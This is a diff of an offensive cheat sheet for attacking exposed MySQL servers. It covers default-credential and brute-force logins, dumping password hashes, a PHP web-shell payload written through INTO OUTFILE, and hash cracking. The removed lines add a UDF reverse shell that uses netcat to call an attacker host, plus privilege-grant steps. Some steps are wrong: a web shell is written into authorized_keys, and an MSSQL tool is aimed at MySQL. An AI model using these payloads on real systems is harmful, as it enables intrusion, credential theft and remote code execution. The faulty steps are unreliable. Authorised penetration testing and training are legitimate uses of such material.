@@ -1,131 +1,75 @@
+# MySQL (3306)
+
 !!! tip "Start here"
-    Try root with no password first: `mysql -h <target> -u root` (no `-p` flag). Many dev/staging instances have no root password set. If that fails, try `root:root`, `root:mysql`, `root:toor`. Remote MySQL exposure is almost always a misconfiguration — check if `FILE` privilege is available to write a web shell.
+    Try root with no password first: `mysql -h 10.10.10.10 -u root` (no `-p` flag). Many dev and staging instances have no root password set. If you get in and the user has `FILE` privilege, you can write a web shell directly to the web root.
+
+---
 
 ## Enumeration
-### Check for Open MySQL Ports
+
 ```bash
-nmap -p 3306 --script mysql-info,mysql-users,mysql-enum,mysql-databases <target-ip>
-```
-## Authentication Attacks
-### Brute-Force
-Hydra:
-```bash
-hydra -L users.txt -P passwords.txt mysql://<target-ip>
+nmap -p 3306 --script mysql-info,mysql-users,mysql-databases 10.10.10.10
 ```
 
-MSF:
+---
+
+## Authentication
+
 ```bash
-msfconsole
-use auxiliary/scanner/mysql/mysql_login
-set RHOSTS <target-ip>
-set USER_FILE users.txt
-set PASS_FILE passwords.txt
-run
+mysql -h 10.10.10.10 -u root
+mysql -h 10.10.10.10 -u root -p
 ```
 
-## Connecting to DB
+!!! tip ""
+    If you get a TLS error, add `--skip-ssl-verify-server-cert`.
+
+---
+
+## Brute Force
+
 ```bash
-mysql -h <target-ip> -u <username> -p
+hydra -L users.txt -P passwords.txt mysql://10.10.10.10
+crackmapexec mssql 10.10.10.10 -u users.txt -p passwords.txt
 ```
 
-**Note:** If TLS error, try adding `--skip-ssl-verify-server-cert`
+---
 
-* try using `-u root` without a password 
+## Enumeration Queries
 
-Check for default credentials:
-```bash
-root:root
-admin:admin
-mysql:mysql
-test:test
-```
-
-## Enumerating DB & Tables
-List users:
 ```sql
-SELECT user, host FROM mysql.user;
-```
-
-Check user privileges:
-```sql
-SHOW GRANTS FOR 'user'@'host';
-```
-
-List DBs
-```sql
+SELECT user, host FROM mysql.user;                          -- list users
+SHOW GRANTS FOR 'root'@'localhost';                        -- check privileges
 SHOW databases;
+USE database_name; SHOW tables;
+SELECT * FROM table_name;
+SELECT host, user, authentication_string FROM mysql.user;  -- dump password hashes
 ```
 
-Select DB:
-```sql
-use database_name;
-```
+---
 
-List tables in DB:
-```sql
-show tables;
-```
+## File Write (FILE Privilege)
 
-Dump data into file:
-```sql
-SELECT * INTO OUTFILE '/var/www/html/dump.txt' FROM table_name;
-```
+If the MySQL user has `FILE` privilege, write a web shell:
 
-## Exploitation
-### Writing Files
-If the MySQL user has FILE privileges, we can create a backdoor and obtain a web shell:
 ```sql
 SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
 ```
 
-Then access via:
-```
-http://target/shell.php?cmd=id
-```
+Access at `http://10.10.10.10/shell.php?cmd=id`.
 
-### Obtaining Shell via `sys_exec` or UDF Exploits
-If User Defined Functions (UDFs) are enabled, execute system commands:
-1. Upload malicious shared object (`.so`) file
+Dump a table to disk:
+
 ```sql
-CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
+SELECT * INTO OUTFILE '/tmp/dump.txt' FROM table_name;
 ```
 
-2. Execute commands
-```sql
-SELECT sys_exec('nc -e /bin/bash <attacker-ip> <port>');
-```
+---
 
-## Privilege Escalation
-### MySQL (Linux)
-If MySQL runs as root, escalate privileges by writing to `.ssh/authorized_keys`
-```sql
-SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/root/.ssh/authorized_keys';
-```
+## Hash Cracking
 
-Then login via SSH as root:
-```
-ssh -i <key> root@<target>
-```
-### User Grants
-If a low-privileged user has `FILE` or `EXECUTE` privileges, **escalate privileges**.
-Check for dangerous privileges:
-```sql
-SELECT * FROM information_schema.user_privileges WHERE privilege_type='FILE' OR privilege_type='EXECUTE';
-```
-
-Enable SUDO privileges:
-```sql
-GRANT ALL PRIVILEGES ON *.* TO 'user'@'%' IDENTIFIED BY 'newpassword' WITH GRANT OPTION;
-FLUSH PRIVILEGES;
-```
-
-## Retrieving Password Hashes
-Dump user hashes:
-```sql
-SELECT host, user, authentication_string FROM mysql.user;
-```
-
-Crack with Hashcat:
 ```bash
-hashcat -m 300 hashes /usr/share/wordlists/rockyou.txt
+hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
+
+!!! tip "Real-world"
+    Remote MySQL exposure is almost always a misconfiguration — it's supposed to be localhost-only. When you find it, check `FILE` and `EXECUTE` privileges immediately. `FILE` gives you LFI/write; UDF exploitation via `EXECUTE` is a path to OS-level RCE but requires uploading a shared library.
